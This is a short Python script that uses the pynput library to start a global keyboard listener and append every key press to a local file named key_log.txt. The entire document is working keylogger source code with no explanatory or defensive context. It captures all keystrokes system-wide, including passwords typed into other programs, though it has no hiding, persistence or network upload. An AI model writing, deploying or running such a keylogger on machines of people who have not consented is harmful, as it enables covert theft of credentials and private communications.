from pynput import keyboard

def getkeys(key):
    with open("key_log.txt",'a') as keylog:
        try:
            # char = key.char
            keylog.write(str(key))
        except:
            print("Error Occured")
        

if __name__ == "__main__":
    listen=keyboard.Listener(on_press=getkeys)
    listen.start()
    input()